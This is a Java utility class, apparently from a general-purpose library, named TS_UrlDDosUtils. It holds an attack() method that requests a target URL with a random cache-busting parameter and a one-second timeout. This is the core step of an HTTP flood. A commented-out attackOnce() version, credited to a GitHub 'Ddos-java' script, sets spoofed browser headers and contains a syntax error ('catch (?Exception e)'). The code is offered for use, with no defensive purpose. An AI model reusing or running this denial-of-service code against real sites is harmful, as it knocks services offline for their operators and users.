package com.tugalsan.api.url.server;

import com.tugalsan.api.random.server.TS_RandomUtils;
import com.tugalsan.api.url.client.TGS_Url;
import com.tugalsan.api.url.client.TGS_UrlQueryUtils;
import com.tugalsan.api.url.client.parser.TGS_UrlParser;
import java.time.Duration;

public class TS_UrlDDosUtils {

    public static void attack(TGS_Url url) {
        var u_parser = TGS_UrlParser.of(url);
        if (u_parser.isExcuse()){
            return;
        }
        var parser = u_parser.value();
        var u = TGS_UrlQueryUtils.readable_2_Param64UrlSafe(String.valueOf(TS_RandomUtils.nextInt(0, Integer.MAX_VALUE)));
        if (u.isExcuse()){
            return;
        }
        parser.quary.setParameterValueUrlSafe("p", u.value());
        TS_UrlDownloadUtils.toByteArray(parser.toUrl(), Duration.ofSeconds(1));
    }
    
    /*
    
    public static void attackOnce(String urlString) {
        attackOnce(urlString, TGS_StringUtils.concat("p=", String.valueOf(TS_RandomUtils.nextInt(0, Integer.MAX_VALUE))));
    }

    public static void attackOnce(String urlString, String paramPair) {
        var url = TGS_UnSafe.call(() -> new URL(urlString), e -> null);
        HttpsURLConnection con = null;
        try {//https://github.com/Abdelaziz-Khabthani/Ddos-java/blob/master/DdosAttack.java
            con = (HttpsURLConnection) url.openConnection();
            con.setDoOutput(true);
            con.setDoInput(true);
            con.setRequestMethod("GET");
            con.setRequestProperty("charset", "utf-8");
            con.setRequestProperty("Host", urlString);
            con.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0");
            con.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            con.setRequestProperty("Content-Length", paramPair);
            System.out.println("getResponseCode:" + con.getResponseCode());
            con.getInputStream();
        } catch (?Exception e) {
            TGS_UnSafe.throwIfInterruptedException(e);
            d.ce("attackOnce", e.getMessage());
        } finally {
            if (con != null) {
                con.disconnect();
            }
        }
    }
    
    
    */
}
